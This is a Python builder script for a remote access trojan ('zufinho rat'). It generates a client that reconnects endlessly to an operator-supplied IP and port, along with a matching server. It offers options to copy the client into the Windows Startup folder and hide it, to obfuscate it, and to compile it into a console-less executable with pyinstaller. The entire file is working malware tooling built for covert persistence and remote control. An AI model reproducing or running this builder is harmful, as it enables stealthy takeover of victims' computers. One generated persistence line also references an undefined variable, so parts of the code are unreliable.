import os
import time

if not os.name=="nt":
    print("working only in windows")
    time.sleep(3)
    exit()
os.system("color 0a")
os.system("title zufinho rat")
name=input("RAT name:")
ip=input("IP (you can use your radmin ip):")
port=int(input("Port:"))
startup=input("Add rat to startup when starts? (Y/N)")
exepy=input("EXE or PY?")
if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
    noconsole=input("hide rat console? (Y/N)")
    obfuscated=input("Obfuscated? (Y/N)")

def py(ip,port,name,noconsole,obf,startup):
    os.system("md temp")
    print("Building py...")
    os.system(r"copy src\client.py temp\client.py")
    os.system(r"copy src\server.py temp\server.py")
    print("copyed temp files...")
    print("creating client...")
    client=open(r"temp\client.py","a")
    if startup==True:
        startupcontent="""
filename = os.path.basename(__file__)
destin = os.path.expandvars(r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
destin_file = os.path.join(destin, filename)
shutil.copy(__file__, destin_file)
os.system(f'attrib +h "{destin_file}"')

"""
        client.write(startupcontent)
    clientcontent=f"""
rat = RAT_CLIENT('{ip}', {port})
if __name__ == '__main__':
    while True:
        try:
            rat.build_connection()
            rat.execute()
        except:
            print("trying reconnect")
"""
    client.write(clientcontent)
    print("client created")
    client.close()
    print("creating server...")
    server=open(f"temp\server.py","a")
    servercontent=f"""
rat = RAT_SERVER('{ip}', {port})

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
    """
    server.write(servercontent)
    server.close()
    print("server created")
    if obf==True:
        print("obfuscating...")
        os.system("src\obfuscator.pyw -o temp\clientobf.py temp\client.py")
        print("obfuscated!")
        if noconsole==True:
            os.system(f"copy temp\clientobf.py {name}.pyw")
            os.system(f"copy temp\server.py {name}_server.py")
        else:
            os.system(f"copy temp\clientobf.py {name}.py")
            os.system(f"copy temp\server.py {name}_server.py")
    else:
        if noconsole==True:
            os.system(f"copy temp\client.py {name}.pyw")
            os.system(f"copy temp\server.py {name}_server.py")
        else:
            os.system(f"copy temp\client.py {name}.py")
            os.system(f"copy temp\server.py {name}_server.py")
    print("modified name")
    print("clearing temp...")
    os.system("rd /q /s temp")
    print("cleared")
    print("rat complete")

def exe(ip,port,name,startup):
    os.system("md temp")
    print("Building py...")
    os.system(r"copy src\client.py temp\client.py")
    os.system(r"copy src\server.py temp\server.py")
    print("copyed temp files...")
    print("creating client...")
    client=open(r"temp\client.py","a")
    if startup==True:
        startupcontent="""
startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
source_path = sys.executable
target_path = os.path.join(startup_path, os.path.basename(source_path))
shutil.copy2(source_path, startup_path)
os.system(f"attrib {sourcepath} {startup_path} +H")

"""
        client.write(startupcontent)
    clientcontent=f"""
rat = RAT_CLIENT('{ip}', {port})

if __name__ == '__main__':
    while True:
        try:
            rat.build_connection()
            rat.execute()
        except:
            print("trying reconnect")
    """
    client.write(clientcontent)
    print("client created")
    client.close()
    print("creating server...")
    server=open(f"temp\server.py","a")
    servercontent=f"""
rat = RAT_SERVER('{ip}', {port})

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
    """
    server.write(servercontent)
    server.close()
    print("server created")
    print("transforming to .exe ...")
    os.system("pyinstaller --onefile --noconsole --i=NONE temp\client.py")
    print("transformed .exe!")
    os.system(f"copy dist\client.exe {name}.exe")
    os.system(f"copy temp\server.py {name}_server.py")
    print("modified name")
    print("clearing temp...")
    os.system("rd /q /s temp")
    os.system("rd /q /s build")
    os.system("rd /q /s dist")
    os.system("del /q client.spec")
    print("cleared")
    print("rat complete")

if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
    if obfuscated=="y" or obfuscated=="Y":
        obfus=True
    else:
        obfus=False
    if noconsole=="Y" or noconsole=="y":
        nocons=True
    else:
        nocons=False
    if startup=="Y" or startup=="y":
        starts=True
    else:
        starts=False
    py(ip=ip,name=name,port=port,noconsole=nocons,obf=obfus,startup=starts)
if exepy=="exe" or exepy=="Exe" or exepy=="eXe" or exepy=="exE" or exepy=="EXe" or exepy=="eXE" or exepy=="EXE":
    if startup=="Y" or startup=="y":
        starts=True
    else:
        starts=False
    exe(ip=ip,port=port,name=name,startup=starts)
os.system("pause")
